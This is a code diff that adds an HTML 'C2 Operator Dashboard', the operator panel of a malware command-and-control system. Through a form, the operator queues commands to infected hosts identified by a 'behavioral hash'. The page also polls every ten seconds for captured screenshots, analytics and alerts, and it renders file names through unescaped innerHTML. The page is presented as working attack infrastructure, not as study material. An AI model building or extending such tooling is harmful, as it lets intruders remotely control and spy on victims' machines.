@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>C2 Operator Dashboard</title>
+</head>
+<body>
+<h1>C2 Operator Dashboard</h1>
+<form id="cmdForm">
+  Behavioral Hash: <input type="text" name="hash" id="hash"/><br>
+  Command: <input type="text" name="cmd" id="cmd" value="ping"/><br>
+  <button type="submit">Queue Command</button>
+</form>
+<hr>
+<h2>Analytics</h2>
+<pre id="analytics"></pre>
+<h2>Screenshots</h2>
+<ul id="shots"></ul>
+<h2>Alerts</h2>
+<ul id="alerts"></ul>
+<script>
+document.getElementById('cmdForm').onsubmit = async function(e) {
+  e.preventDefault();
+  const hash = document.getElementById('hash').value;
+  const cmd = document.getElementById('cmd').value;
+  await fetch('/queue', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({hash, cmd})
+  });
+  alert('Command queued!');
+};
+
+async function loadShots() {
+  let resp = await fetch('/shots');
+  let files = await resp.json();
+  let ul = document.getElementById('shots');
+  ul.innerHTML = '';
+  files.forEach(f => {
+    let li = document.createElement('li');
+    li.innerHTML = `<a href="/${f}" target="_blank">${f}</a>`;
+    ul.appendChild(li);
+  });
+}
+async function loadAnalytics() {
+  let resp = await fetch('/analytics');
+  let data = await resp.json();
+  document.getElementById('analytics').textContent = JSON.stringify(data, null, 2);
+}
+async function loadAlerts() {
+  let resp = await fetch('/alerts');
+  let alerts = await resp.json();
+  let ul = document.getElementById('alerts');
+  ul.innerHTML = '';
+  alerts.forEach(a => {
+    let li = document.createElement('li');
+    li.textContent = a;
+    ul.appendChild(li);
+  });
+}
+loadShots(); loadAnalytics(); loadAlerts();
+setInterval(loadShots, 10000);
+setInterval(loadAnalytics, 10000);
+setInterval(loadAlerts, 10000);
+</script>
+</body>
+</html>
